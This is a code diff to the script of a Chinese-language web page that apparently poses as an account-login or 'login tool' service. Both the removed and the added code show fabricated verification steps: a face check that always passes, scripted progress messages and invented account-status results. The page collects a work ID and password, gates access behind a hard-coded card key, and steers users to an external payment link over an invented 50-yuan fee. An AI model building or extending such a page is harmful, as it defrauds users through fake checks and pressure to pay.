+function showPromoteModal() {
+  document.getElementById('promoteModal').style.display = 'flex';
+}
+function closePromoteModal() {
+  document.getElementById('promoteModal').style.display = 'none';
+}
 
-    async function startFace() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: 640, height: 480 }
-            });
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-                video.play();
-            };
-            faceTip.innerText = '请正对摄像头';
-            setTimeout(() => faceTip.innerText = '请眨眼睛', 1500);
-            setTimeout(() => faceTip.innerText = '请轻轻摇头', 3500);
-            setTimeout(() => {
-                faceTip.innerText = '认证中...';
-                faceResult.innerText = '认证成功，正在进入系统...';
-            }, 5500);
-            setTimeout(() => {
-                facePage.style.display = 'none';
-                mainContainer.style.display = 'block';
-            }, 6500);
-        } catch (e) {
-            faceTip.innerText = '设备不支持人脸识别，自动通过';
-            faceResult.innerText = '认证成功';
-            setTimeout(() => {
-                facePage.style.display = 'none';
-                mainContainer.style.display = 'block';
-            }, 2000);
-        }
-    }
+function showFloat(){ document.getElementById('floatMask').style.display = 'flex'; }
+function closeFloat(){ document.getElementById('floatMask').style.display = 'none'; }
 
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
-    const loginBtn = document.getElementById('login-btn');
-    const loadingElement = document.getElementById('loading');
-    const statusOutput = document.getElementById('status-output');
-    const cardCodeModal = document.getElementById('cardCodeModal');
-    const cardCodeInput = document.getElementById('cardCodeInput');
-    const cardCodeBtn = document.getElementById('cardCodeBtn');
-    const modalError = document.getElementById('modalError');
-    const CORRECT_CODE = 'QQWWCC123';
-    const JUMP_URL = 'https://xiaoyou610.github.io/nb/';
+// 关闭省份提示
+function closeProvinceTip() {
+  document.getElementById('loadingModal').style.display = 'none';
+}
 
-    loginBtn.addEventListener('click', function() {
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value.trim();
-        if (!username) {
-            alert("请输入工号！");
-            return;
-        }
-        if (!password) {
-            alert("请输入密码！");
-            return;
-        }
-        cardCodeModal.style.display = 'flex';
-        cardCodeInput.focus();
-    });
+function startAutoVerify(){
+  let workId = document.getElementById('workId').value.trim();
+  let pwd = document.getElementById('pwd').value.trim();
+  let prov = document.getElementById('province').value.trim();
+  if(!workId || !pwd){
+    alert('请输入工号和密码，不能为空！');
+    return;
+  }
+  if(workId.length < 3 || pwd.length < 3){
+    alert('工号和密码长度不能少于3位！');
+    return;
+  }
+  const modal = document.getElementById('loadingModal');
+  const loadText = document.getElementById('loadText');
+  const provTip = document.getElementById('provTip');
+  const closeBtn = document.getElementById('closeTipBtn');
+  const progress = document.getElementById('loadProgress');
+  const noticeList = document.getElementById('noticeList');
+  const priceTip = document.getElementById('priceTip');
+  const agreeRow = document.getElementById('agreeRow');
+  const priceBtn = document.getElementById('priceBtn');
+  modal.style.display = 'flex';
+  progress.style.width = '0%';
+  
+  provTip.style.display = 'none';
+  closeBtn.style.display = 'none';
+  noticeList.style.display = 'none';
+  priceTip.style.display = 'none';
+  agreeRow.style.display = 'none';
+  priceBtn.style.display = 'none';
+  // 没选省份 → 显示红色提示 + 关闭按钮
+  if(prov === ''){
+    let randIndex = Math.floor(Math.random() * allProvinces.length);
+    let randProv = allProvinces[randIndex];
+    
+    loadText.innerText = "请选择省份后继续";
+    provTip.innerText = "请切换至 " + randProv;
+    provTip.style.display = "block";
+    closeBtn.style.display = "inline-block"; // 显示关闭
+    progress.style.width = "100%";
+    return;
+  }
+  // 选了省份 → 正常流程
+  setTimeout(()=>{ loadText.innerText='正在安全校验...'; progress.style.width='30%'; }, 700);
+  setTimeout(()=>{ loadText.innerText='正在准备上号环境...'; progress.style.width='60%'; }, 1400);
+  setTimeout(()=>{
+    loadText.innerText='上号器授权说明';
+    progress.style.width='100%';
+    noticeList.style.display = 'block';
+    priceTip.style.display = 'block';
+    agreeRow.style.display = 'flex';
+    priceBtn.style.display = 'block';
+  }, 2100);
+}
 
-    cardCodeBtn.addEventListener('click', () => {
-        const inputCode = cardCodeInput.value.trim();
-        if (inputCode === CORRECT_CODE) {
-            modalError.style.display = 'none';
-            cardCodeModal.style.display = 'none';
-            loginBtn.disabled = true;
-            loadingElement.style.display = 'block';
-            statusOutput.innerHTML = '';
-            
-            addStatusEntry("账号状态正常", "success");
-            setTimeout(() => addStatusEntry("实名人正常", "success"), 800);
-            setTimeout(() => addStatusEntry("手机号/邮箱正常", "success"), 1600);
-            setTimeout(() => addRedPayEntry(), 2400);
-            setTimeout(() => addPayErrorEntry(), 3200);
-            
-            setTimeout(() => {
-                loadingElement.style.display = 'none';
-                loginBtn.disabled = false;
-                loginBtn.textContent = "验证完成";
-                loginBtn.style.background = "linear-gradient(to right, #00aa55, #00cc66)";
-            }, 4000);
-        } else {
-            modalError.style.display = 'block';
-            setTimeout(() => modalError.style.display = 'none', 2000);
-        }
-    });
+function checkPriceAgree(){
+  let check = document.getElementById('agreeCheck2').checked;
+  document.getElementById('priceBtn').disabled = !check;
+}
 
-    cardCodeInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') cardCodeBtn.click();
-    });
+function showCardModal(){
+  document.getElementById('loadingModal').style.display = 'none';
+  document.getElementById('cardModal').style.display = 'flex';
+}
 
-    function getCurrentTime() {
-        const now = new Date();
-        return now.toLocaleTimeString('zh-CN', { hour12: false });
-    }
+// 卡密验证：只有输入 yynbww 才通过
+function checkCard(){
+  let card = document.getElementById('cardInput').value.trim();
+  if(!card){
+    alert('请输入卡密！');
+    return;
+  }
+  if(card !== CORRECT_CARD){
+    alert('卡密错误，请重新输入！');
+    document.getElementById('cardInput').value = '';
+    return;
+  }
+  // 卡密正确 → 登录成功
+  document.getElementById('cardModal').style.display = 'none';
+  document.getElementById('successModal').style.display = 'flex';
+}
 
-    function addStatusEntry(message, type = "success") {
-        const statusEntry = document.createElement('div');
-        statusEntry.className = 'status-entry';
-        let typeLabel = "[成功]";
-        statusEntry.innerHTML = `<span class="status-time">${typeLabel} ${getCurrentTime()}</span> ${message}`;
-        statusOutput.appendChild(statusEntry);
-        statusOutput.scrollTop = statusOutput.scrollHeight;
-    }
+function goToPay(){
+  window.open("https://xiaoyou610.github.io/nb/", "_blank");
+}
 
-    // 代缴费50元 红色+叉号
-    function addRedPayEntry() {
-        const statusEntry = document.createElement('div');
-        statusEntry.className = 'status-entry red-text';
-        statusEntry.innerHTML = `<span class="status-time">[失败] ${getCurrentTime()}</span> ❌ 未缴费：50元`;
-        statusOutput.appendChild(statusEntry);
-        statusOutput.scrollTop = statusOutput.scrollHeight;
-    }
+function closeSuccess(){
+  document.getElementById('successModal').style.display = 'none';
+}
 
-    function addPayErrorEntry() {
-        const statusEntry = document.createElement('div');
-        statusEntry.className = 'status-entry';
-        const typeLabel = "[提示]";
-        statusEntry.innerHTML = `<span class="status-time">${typeLabel} ${getCurrentTime()}</span> 缴费异常？<span class="jump-link" id="payJumpLink">点我</span>处理`;
-        statusOutput.appendChild(statusEntry);
-        document.getElementById('payJumpLink').addEventListener('click', () => {
-            window.open(JUMP_URL, '_blank');
-        });
-    }
-
-    window.addEventListener('DOMContentLoaded', () => {
-        statusOutput.innerHTML = '';
-    });
+function doChangeIp(){
+  const province = document.getElementById('province').value;
+  if(!province){
+    alert('请先选择省份！');
+    return;
+  }
+  const tipBar = document.getElementById('ipTipBar');
+  const ipArea = document.getElementById('ipArea');
+  const timer = document.getElementById('timer');
+  ipArea.innerText = province;
+  tipBar.style.display = 'flex';
+  seconds = 0;
+  clearInterval(timerInterval);
+  timerInterval = setInterval(() => {
+    seconds++;
+    const min = String(Math.floor(seconds / 60)).padStart(2, '0');
+    const sec = String(seconds % 60).padStart(2, '0');
+    timer.innerText = `${min}:${sec}`;
+  }, 1000);
+}
 </script>
 </body>
 </html>
